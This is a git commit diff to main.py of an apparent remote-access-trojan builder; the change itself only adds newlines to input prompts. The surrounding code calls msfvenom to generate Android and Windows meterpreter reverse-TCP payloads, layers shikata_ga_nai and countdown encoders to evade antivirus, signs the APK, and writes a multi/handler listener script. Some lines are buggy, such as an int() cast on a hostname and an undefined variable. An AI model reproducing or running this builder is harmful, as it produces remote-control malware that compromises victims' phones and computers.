825b677148b4d6309dcde2172f23ac35b5108eb4
Camilo Trouy <55851157+LightHades@users.noreply.github.com>
2021-01-31 18:55:37 +0000

    Update main.py

--- main.py
+++ main.py
@@ -103,18 +103,18 @@ def main():
                 print('\n\033[34m[*]\033[0m Process completed, files \033[34;4m{}.apk\033[0m and \033[34;4m{}-console.rc\033[0m created successfully;\n\033[34m[*]\033[0m To open the listening, execute: \033[34;4mmsfconsole -r {}-console.rc\033[0m\n'.format(name, name, name))
 
             elif tunnel == 2:
-                name = input(' [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mfile name\033[0m) > ')
-                lport = int(input(' [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mlport\033[0m) > '))
-                pport = int(input(' [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mportmap port\033[0m) > '))
-                phost = input(' [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mportmap host\033[0m) > ')
+                name = input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mfile name\033[0m) > ')
+                lport = int(input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mlport\033[0m) > '))
+                pport = int(input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mportmap port\033[0m) > '))
+                phost = input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mportmap host\033[0m) > ')
                 os.system('msfvenom -p android/meterpreter/reverse_tcp lhost={} lport={} --platform android -o {}.apk && d2j-apk-sign {}.apk && rm -f {}.apk && mv {}-signed.apk {}.apk'.format(phost, pport, name, name, name, name, name))
                 console_rc(name, 'use multi/handler\nset payload android/meterpreter/reverse_tcp\nset lhost 127.0.0.1\nset lport {}\nset ExitOnSession false\nexploit -j'.format(lport))
                 print('\n\033[34m[*]\033[0m Process completed, files \033[34;4m{}.apk\033[0m and \033[34;4m{}-console.rc\033[0m created successfully;\n\033[34m[*]\033[0m To open the listening, execute: \033[34;4mmsfconsole -r {}-console.rc\033[0m\n'.format(name, name, name))
 
             elif tunnel == 3:
-                name = input(' [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mfile name\033[0m) > ')
-                lhost = int(input(' [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mno-ip host\033[0m) > '))
-                lport = int(input(' [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mlport\033[0m) > '))
+                name = input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mfile name\033[0m) > ')
+                lhost = int(input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mno-ip host\033[0m) > '))
+                lport = int(input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mlport\033[0m) > '))
                 os.system('msfvenom -p android/meterpreter/reverse_tcp lhost={} lport={} --platform android -o {}.apk && d2j-apk-sign {}.apk && rm -f {}.apk && mv {}-signed.apk {}.apk'.format(ip, lport, name, name, name, name, name))
                 console_rc(name, 'use multi/handler\nset payload android/meterpreter/reverse_tcp\nset lhost {}\nset lport {}\nset ExitOnSession false\nexploit -j'.format(lhost, lport))
                 print('\n\033[34m[*]\033[0m Process completed, files \033[34;4m{}.apk\033[0m and \033[34;4m{}-console.rc\033[0m created successfully;\n\033[34m[*]\033[0m To open the listening, execute: \033[34;4mmsfconsole -r {}-console.rc\033[0m\n'.format(name, name, name))
@@ -145,19 +145,19 @@ def main():
                 print('\n\033[34m[*]\033[0m Process completed, files \033[34;4m{}.exe\033[0m and \033[34;4m{}-console.rc\033[0m created successfully;\n\033[34m[*]\033[0m To open the listening, execute: \033[34;4mmsfconsole -r {}-console.rc\033[0m\n'.format(name, name, name))
 
             elif tunnel == 2:
-                name = input(' [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mfile name\033[0m) > ')
-                lport = int(input(' [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mlport\033[0m) > '))
-                pport = int(input(' [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mportmap port\033[0m) > '))
-                phost = input(' [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mportmap host\033[0m) > ')
+                name = input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mfile name\033[0m) > ')
+                lport = int(input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mlport\033[0m) > '))
+                pport = int(input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mportmap port\033[0m) > '))
+                phost = input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mportmap host\033[0m) > ')
                 os.system('msfvenom -p windows/meterpreter/reverse_tcp lhost={} lport={} -e x86/shikata_ga_nai -a x86 -f raw --platform windows | msfvenom -a x86 --platform windows -e x86/countdown -i 4 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -f exe -o {}'.format(phost, pport, name))
                 os.system('rm -f {}'.format(name))
                 console_rc(name, 'use multi/handler\nset payload android/meterpreter/reverse_tcp\nset lhost 127.0.0.1\nset lport {}\nset ExitOnSession false\nexploit -j'.format(lport))
                 print('\n\033[34m[*]\033[0m Process completed, files \033[34;4m{}.exe\033[0m and \033[34;4m{}-console.rc\033[0m created successfully;\n\033[34m[*]\033[0m To open the listening, execute: \033[34;4mmsfconsole -r {}-console.rc\033[0m\n'.format(name, name, name))
 
             elif tunnel == 3:
-                name = input(' [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mfile name\033[0m) > ')
-                lhost = int(input(' [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mno-ip host\033[0m) > '))
-                lport = int(input(' [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mlport\033[0m) > '))
+                name = input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mfile name\033[0m) > ')
+                lhost = int(input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mno-ip host\033[0m) > '))
+                lport = int(input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mlport\033[0m) > '))
                 os.system('msfvenom -p windows/meterpreter/reverse_tcp lhost={} lport={} -e x86/shikata_ga_nai -a x86 -f raw --platform windows | msfvenom -a x86 --platform windows -e x86/countdown -i 4 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -f exe -o {}'.format(lhost, lport, name))
                 os.system('rm -f {}'.format(name))
                 console_rc(name, 'use multi/handler\nset payload android/meterpreter/reverse_tcp\nset lhost {}\nset lport {}\nset ExitOnSession false\nexploit -j'.format(lhost, lport))
@@ -201,7 +201,7 @@ def main():
 
     elif sys == 6:
         network()
-        net = int(input(' [\033[32m+\033[0m] \033[4mRAT\033[0m > '))
+        net = int(input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m > '))
 
         if net == 1:
             lport = int(input('\n [\033[32m+\033[0m] \033[4mRAT\033[0m (\033[32mlport\033[0m) > '))
